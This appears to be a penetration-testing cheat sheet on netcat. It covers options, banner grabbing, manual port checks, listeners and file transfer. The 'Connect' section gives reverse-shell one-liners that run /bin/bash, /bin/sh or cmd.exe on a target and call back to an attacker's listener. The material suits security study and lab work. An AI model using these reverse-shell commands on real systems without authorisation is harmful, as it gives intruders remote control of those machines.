# netcat (nc)
> Netcat (the "TCP/IP Swiss Army Knife") is a networking utility used to read and write data to network connections using TCP or UDP.

## Contents
- [Intro](#intro)
  - [Remote Access Tool](#remote-access-tool)
  - [Two Modes](#two-modes)
  - [Options](#options)
- [Connecting to Ports (client mode)](#connecting-to-ports-client-mode)
  - [Standard Syntax](#standard-syntax)
  - [Additional Information](#additional-information)
  - [Manually Check Ports](#manually-check-ports)
- [Listener](#listener)
- [Connect](#connect)
  - [Connect to listener from Linux](#connect-to-the-listener-from-a-linux-target-machine)
  - [Connect to listener from Windows](#connect-to-the-listener-from-a-windows-target-machine)
- [File Input/Output](#file-inputoutput)

## Intro

### Remote Access Tool
- NetCat is a popular remote access tool.
- It has a small footprint so it's portable. It can set up a reverse shell easily.
  - In Kali the Windows executable is found here: `/usr/share/windows-binaries/nc.exe`
- Netcat can be used by penetration testers to perform the following functionality:
  - Banner Grabbing
  - Port Scanning
  - Tranferring Files
  - Bind/Reverse Shells
- Resources: [Simple How-To](https://jeffreytse.net/computer/2020/10/14/how-to-use-netcat-command.html) | [Basic Usage](https://www.geeksforgeeks.org/netcat-basic-usage-and-overview/)

### Two Modes
- Netcat utilizes a client-server communication architecture with two modes:
  - **Client [Connect] Mode:** Netcat can be used in a client mode to connect to any TCP/UDP port; it can also be used to connect to a remote listener (a remote Netcat server).
  - **Server [LIsten] Mode:** Netcat can be used to listen for connections from clients on a specific port.

### Options
- Some options to be aware of...
- `-v  --verbose` : set verbosity levels (`-v` is lower level, `-vv` is more, `-vvv`, etc.)
- `-u  --udp` : use UDP instead of the default TCP
- `-l  --listen` : bind (to a specified port) and listen for incoming connections
- `-n  --nodns` : do not resolve hostnames via DNS
- `-p  --source-port <port#>` : specify the source port to use
- `-e  --exec <command>` : executes the given command 

## Connecting to Ports (client mode)

### Standard Syntax
```
nc [target ip] [target port]  
nc 10.4.20.244 80              # example
```
- Netcat allows you to connect to a specific TCP or UDP port.
- This can allows you to do banner grabbing and things of that nature (once you connect, the target may give you a service banner with helpful information).

### Additional Information
- If your initial connection (like the above) results in nothing (no service banner), then you need to add some options.
```
nc -nv 10.4.20.244 80      # this will give you a little bit more information (e.g., confirmation of the connection).
nc -nvu 10.4.20.244 139    # check UDP
```

### Manually Check Ports
- Nmap will find open ports, and a service version scan will most often provide detailed information about what services (and their versions) are running on those open ports.
- This is not, however, the case all the time. 
- Whenever you see a question mark next to an nmap result, that means nmap is give you a best guess.
- You should always check these items **_manually_** with Netcat.

## Listener
- Set up the listener on your attack machine:
```
nc -nvlp 1234     # TCP listener
nc -nvlup 1234    # UDP listener
```

## Connect

### Connect to the listener from a Linux target machine
```
nc [listener IP] [port] –e /bin/bash
nc [listener IP] [port] –e /bin/sh
```

### Connect to the listener from a Windows target machine
```
nc.exe [listener IP] [port] –e cmd.exe
```

## File Input/Output

Send output from a listener to a text file:
```
nc -nvlp [port number] > filename.txt
```

Send output from a text file to a remote machine (this can be used to transfer any type of file: text, binary, etc.):
```
nc [IP Address] [port] < filename.txt
```
